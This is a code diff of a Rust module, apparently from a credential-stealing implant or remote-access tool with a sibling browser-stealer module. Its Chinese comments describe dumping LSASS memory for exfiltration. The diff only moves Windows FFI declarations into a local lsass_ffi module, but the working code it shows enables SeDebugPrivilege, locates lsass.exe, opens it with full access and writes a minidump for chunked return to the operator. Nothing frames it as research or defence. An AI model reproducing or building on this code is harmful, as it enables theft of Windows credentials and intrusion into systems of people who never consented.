@@ -1,16 +1,15 @@
 //! LSASS 内存转储：提 SeDebugPrivilege → 按名定位 lsass.exe → MiniDumpWriteDump。
 //! 转储文件落盘后由文件模块分块回传。需要 SYSTEM 或 SeDebugPrivilege 权限。
-//!
-//! 共享的 kernel32/advapi32 FFI 复用 `browser_stealer::browser_ffi`，避免重复声明。
 
 #![allow(non_snake_case)]
-// 本模块依赖 Windows 专属 FFI（browser_stealer::browser_ffi 为 Windows-only），
-// 非 Windows 平台不编译（creds lib.rs 已按平台门控）。
+// 本模块依赖 Windows 专属 FFI（lsass_ffi），非 Windows 平台不编译
+// （creds lib.rs 已按平台门控）。
 #![cfg(target_os = "windows")]
 
 use std::ffi::c_void;
 
-use crate::browser_stealer::browser_ffi::{self, PROCESSENTRY32W, TOKEN_PRIVILEGES};
+mod lsass_ffi;
+use lsass_ffi::{PROCESSENTRY32W, TOKEN_PRIVILEGES};
 
 const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
 const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
@@ -55,8 +54,8 @@ fn wide(s: &str) -> Vec<u16> {
 /// 提 SeDebugPrivilege。
 unsafe fn enable_se_debug() {
     let mut token: isize = 0;
-    if browser_ffi::OpenProcessToken(
-        browser_ffi::GetCurrentProcess(),
+    if lsass_ffi::OpenProcessToken(
+        lsass_ffi::GetCurrentProcess(),
         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
         &mut token,
     ) == 0
@@ -65,13 +64,13 @@ unsafe fn enable_se_debug() {
     }
     let name = wide("SeDebugPrivilege");
     let mut luid: i64 = 0;
-    if browser_ffi::LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) != 0 {
+    if lsass_ffi::LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) != 0 {
         let tp = TOKEN_PRIVILEGES {
             PrivilegeCount: 1,
             Luid: luid,
             Attributes: SE_PRIVILEGE_ENABLED,
         };
-        let _ = browser_ffi::AdjustTokenPrivileges(
+        let _ = lsass_ffi::AdjustTokenPrivileges(
             token,
             0,
             &tp as *const TOKEN_PRIVILEGES,
@@ -80,12 +79,12 @@ unsafe fn enable_se_debug() {
             std::ptr::null_mut(),
         );
     }
-    browser_ffi::CloseHandle(token);
+    lsass_ffi::CloseHandle(token);
 }
 
 /// 按进程名查找 PID。
 unsafe fn find_pid_by_name(name: &str) -> Option<u32> {
-    let snap = browser_ffi::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    let snap = lsass_ffi::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if snap == INVALID_HANDLE {
         return None;
     }
@@ -94,19 +93,19 @@ unsafe fn find_pid_by_name(name: &str) -> Option<u32> {
     entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
     let mut found = None;
 
-    if browser_ffi::Process32FirstW(snap, &mut entry) != 0 {
+    if lsass_ffi::Process32FirstW(snap, &mut entry) != 0 {
         loop {
             let exe = String::from_utf16_lossy(&entry.szExeFile);
             if exe.trim_end_matches('\0').eq_ignore_ascii_case(name) {
                 found = Some(entry.th32ProcessID);
                 break;
             }
-            if browser_ffi::Process32NextW(snap, &mut entry) == 0 {
+            if lsass_ffi::Process32NextW(snap, &mut entry) == 0 {
                 break;
             }
         }
     }
-    browser_ffi::CloseHandle(snap);
+    lsass_ffi::CloseHandle(snap);
     found
 }
 
@@ -120,7 +119,7 @@ pub fn dump_lsass(dump_path: &str) -> String {
             None => return r#"{"success":false,"error":"lsass.exe not found"}"#.to_string(),
         };
 
-        let process = browser_ffi::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+        let process = lsass_ffi::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
         if process == 0 {
             return r#"{"success":false,"error":"OpenProcess(lsass) failed — need SeDebugPrivilege/SYSTEM"}"#.to_string();
         }
@@ -136,7 +135,7 @@ pub fn dump_lsass(dump_path: &str) -> String {
             std::ptr::null_mut(),
         );
         if file == INVALID_HANDLE {
-            browser_ffi::CloseHandle(process);
+            lsass_ffi::CloseHandle(process);
             return r#"{"success":false,"error":"CreateFile failed"}"#.to_string();
         }
 
@@ -149,8 +148,8 @@ pub fn dump_lsass(dump_path: &str) -> String {
             std::ptr::null_mut(),
             std::ptr::null_mut(),
         );
-        browser_ffi::CloseHandle(file);
-        browser_ffi::CloseHandle(process);
+        lsass_ffi::CloseHandle(file);
+        lsass_ffi::CloseHandle(process);
 
         if ok == 0 {
             return r#"{"success":false,"error":"MiniDumpWriteDump failed"}"#.to_string();
